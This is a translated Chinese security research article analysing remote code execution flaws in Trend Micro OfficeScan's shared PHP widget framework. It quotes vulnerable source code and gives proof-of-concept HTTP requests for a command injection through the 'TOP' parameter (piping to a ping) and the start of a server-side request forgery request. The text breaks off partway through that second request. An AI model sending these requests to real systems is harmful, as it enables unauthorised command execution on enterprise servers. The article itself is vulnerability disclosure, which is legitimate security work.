# 【技术分享】揭秘通杀多款趋势科技产品的RCE漏洞
|
##### 译文声明
本文是翻译文章，文章来源：安全客
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
译者：[shan66](http://bobao.360.cn/member/contribute?uid=2522399780)
预估稿费：200RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**前言**
框架的安全性已经越来越引起安全人员的关注，例如Apache
Struts案例中由于框架内单一漏洞所引发的安全冲击想必大家早有耳闻。如果从产品供应商的角度来考虑这种风险的话，我们也能找到非常类似的情形。在本文中，我将向您展示如何在不同的趋势科技产品远程执行代码，因为这些不同产品都使用了相同的代码库。
**一个漏洞通杀所有产品——趋势科技产品的Widget**
大多数趋势科技的产品都为管理员网页提供了相应的widget。虽然核心系统是通过Java/.NET编写的，但是这个widget机制却是用PHP实现的。这就意味着，每当使用widget时，相应的产品中必须植入PHP解释器。这对于攻击者来说，简直就是一个完美的情形：由于各种不同的产品中含有相同的代码库，所以一旦从中发现了漏洞，就能够顺利搞定所有的产品。
由于上面提到的原因，我对趋势科技OfficeScan产品的widget系统进行了一次代码审核。这次审计的结果一方面是非常有趣的，同时对我来说也是不幸的，因为虽然找到了6个不同的漏洞，但只有2个是0day。
在深入了解该漏洞之前，我想先分享一下这个widget库的工作原理。
**从头开始**
****
这个widget框架有一个代理机制。简而言之，我们有一个 **proxy_controller.php**
端点，它会接收用户提供的参数，然后根据用户的输入来调用相关的类。
widget的类型主要有两种：用户生成的widget和默认的widget。以下源代码取自proxy_controller.php文件。
        if(!isset($g_GetPost)){
            $g_GetPost = array_merge($_GET,$_POST);
        }else{
            $g_GetPost = array_merge($g_GetPost,$_GET,$_POST);
        }
        // ... CODE OMIT ...
        $server_module = $g_GetPost['module'];
        $isDirectoryTraversal = WF::getSecurityFactory()->getSanitize()->isDirectoryTraversal($server_module);
        if(true === $isDirectoryTraversal){
            mydebug_log("Bad guy come in!!");
            proxy_error(WF_PROXY_ERR_INIT_INVALID_MODULE, WF_PROXY_ERR_INIT_INVALID_MODULE_MSG);
        }
        $intUserGeneratedInfoOfWidget = (array_key_exists('userGenerated', $g_GetPost)) ? $g_GetPost['userGenerated'] : 0;
        if($intUserGeneratedInfoOfWidget == 1){
            $strProxyDir = USER_GENERATED_PROXY_DIR;
        }else{
            $strProxyDir = PROXY_DIR;
        }
        $myproxy_file = $strProxyDir . "/" . $server_module . "/Proxy.php";
        //null byte injection prevents
        if( is_string( $myproxy_file ) ) {
            $myproxy_file = str_replace( "", '', $myproxy_file );
        }
        // does file exist?
        if(file_exists($myproxy_file)){
            include ($myproxy_file);
        }else{
            proxy_error(WF_PROXY_ERR_INIT_INVALID_MODULE, WF_PROXY_ERR_INIT_INVALID_MODULE_MSG);
        }
        // does class exist?
        if(! class_exists("WFProxy")){
            proxy_error(WF_PROXY_ERR_INIT_MODULE_ERROR, WF_PROXY_ERR_INIT_MODULE_ERROR_MSG);
        }
        // ... CODE OMIT ...
        $request = new WFProxy($g_GetPost, $wfconf_dbconfig);
        $request->proxy_exec();
        $request->proxy_output();
上述代码块将分别执行以下操作。
1\. 合并GET和POST参数，然后将它们存储到$ g_GetPost变量中。
2\. 验证$ g_GetPost ['module']变量。
3\. 然后通过检测$ g_GetPost ['userGenerated']参数来确定是否请求由用户生成的窗口widget。
4\. 包含所需的php类。
5\. 作为最后一步，创建一个WFProxy实例，然后调用proxy_exec()和proxy_output()方法。
基本上，我们会有多个WFProxy实现，而具体引用哪一个WFProxy实现则是由来自客户端的值所决定的。
好了，有了上面的知识做铺垫，接下来就可以深入探讨我发现的各种技术细节了，因为所有这些内容，都是关于如何利用不同的类来传递参数的。
**漏洞＃1——认证命令注入**
****
以下代码取自modTMCSS的WFProxy实现。
              public function proxy_exec() 
        {
          // localhost, directly launch report.php
          if ($this->cgiArgs['serverid'] == '1')
          {
                  if($this->cgiArgs['type'] == "WR"){
                      $cmd = "php ../php/lwcs_report.php ";
                      $this->AddParam($cmd, "t");
                      $this->AddParam($cmd, "tr");
                      $this->AddParam($cmd, "ds");
                      $this->AddParam($cmd, "m");
                      $this->AddParam($cmd, "C");
                      exec($cmd, $this->m_output, $error);
                      if ($error != 0)
                      {
                          $this->errCode = WF_PROXY_ERR_EXEC_OTHERS;
                          $this->errMessage = "exec lwcs_report.php failed. err = $error";
                      }
                  }
                  else{        
                      $cmd = "php ../php/report.php ";
                      $this->AddParam($cmd, "T");
                      $this->AddParam($cmd, "D");
                      $this->AddParam($cmd, "IP");
                      $this->AddParam($cmd, "M");
                      $this->AddParam($cmd, "TOP");
                      $this->AddParam($cmd, "C");
                      $this->AddParam($cmd, "CONSOLE_LANG");
                      exec($cmd, $this->m_output, $error);
                      if ($error != 0)
                      {
                          $this->errCode = WF_PROXY_ERR_EXEC_OTHERS;
                          $this->errMessage = "exec report.php failed. err = $error";
                      }
                  }
          }
        private function AddParam(&$cmd, $param)
        {
          if (isset($this->cgiArgs[$param]))
          {
            $cmd = $cmd.$param."=".$this->cgiArgs[$param]." ";
          }
        }
显然，我们有可能从这里找到一个命令注入漏洞。但是我们还面临一个问题：我们可以控制$this-> cgiArgs数组吗？
答案是肯定的。如果回顾一下前面的代码，你会发现$request = new
WFProxy（$g_GetPost，$wfconf_dbconfig），因此$g_GetPost是完全可控的。
每一个WFProxy类都继承自ABaseProxy抽象类；下面是这个基类的__construct方法的前两行代码。
public function __construct($args, $dbconfig){
$this->cgiArgs = $args;
这意味着，$this->cgiArgs直接是通过GET和POST参数进行填充的。
**PoC**
        POST /officescan/console/html/widget/proxy_controller.php HTTP/1.1
        Host: 12.0.0.184
        User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
        Cookie:; LogonUser=root; wf_CSRF_token=fb5b76f53eb8ea670c3f2d4906ff1098; PHPSESSID=edir98ccf773n7331cd3jvtor5;
        X-CSRFToken: fb5b76f53eb8ea670c3f2d4906ff1098
        ctype: application/x-www-form-urlencoded; charset=utf-8
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 6102
        module=modTMCSS&serverid=1&TOP=2>&1|ping 4.4.4.4
重要提示：当exec()函数用于第二和第三个函数参数时，如果要使用管道技巧的话，则只需要成功执行第一个命令即可。这时，我们的命令将变成php
../php/lwcs_report.php TOP = 2>＆1 | ping
4.4.4.4。其中，这里使用2>＆1是为了欺骗exec()函数，因为我们在产品根本就没有lwsc_report.php这个脚本。因此，命令的第一部分总是返回command
not found错误。
不幸的是，我意识到这个漏洞是由Source Incite的Steven
Seeley发现的；并且，在几个星期前，供应商就发布了相应的补丁（http://www.zerodayinitiative.com/advisories/ZDI-17-521/）。
根据该补丁建议来看，需要进行身份验证之后才能利用该漏洞。此外，我找到了一种方法，可以来绕过身份验证，目前这种漏洞利用方法还是一个0day。
关于这个0day的详细介绍，请参考漏洞#_6。
**漏洞＃2＃3＃4——泄露私钥 & 公开访问Sqlite3 & SSRF**
****
另一位研究人员（John
Page，又名hyp3rlinx）也发现了这些漏洞。不过，这些漏洞并非本文的重点关注对象，所以不做介绍。对于这些漏洞的技术细节感兴趣的读者，可以访问下面的链接。
**漏洞＃5——服务端请求伪造（0day）**
****
您还记得以前提到过的那两种类型的widget（用户生成的widget和系统widget）吗？
趋势科技在代码库中提供了一个默认用户生成的widget实现。它的名字是modSimple。我相信它肯定还留在项目中，用来演示如何实现自定义widget。
下面是这个widget的proxy_exec()函数的实现代码。
        public function proxy_exec() {
          $this->httpObj->setURL(urldecode($this->cgiArgs['url']));
          if( $this->httpObj->Send() == FALSE ) {
            //Handle Timeout issue here
            if($this->httpObj->getErrCode()===28)
            {
              $this->errCode = WF_PROXY_ERR_EXEC_TIMEOUT;
            }
            else
            {
              $this->errCode = WF_PROXY_ERR_EXEC_CONNECT;
            }
            $this->errMessage = $this->httpObj->getErrMessage();
          }
        }
我们可以看到，它直接就使用了url参数，而没有进行任何验证。也许您还记得，$this-> cgiArgs ['url']是一个用户控制的变量。
**PoC**
        POST /officescan/console/html/widget/proxy_controller.php HTTP/1.1
        Host: 12.0.0.200
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36
        Accept: application/json
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate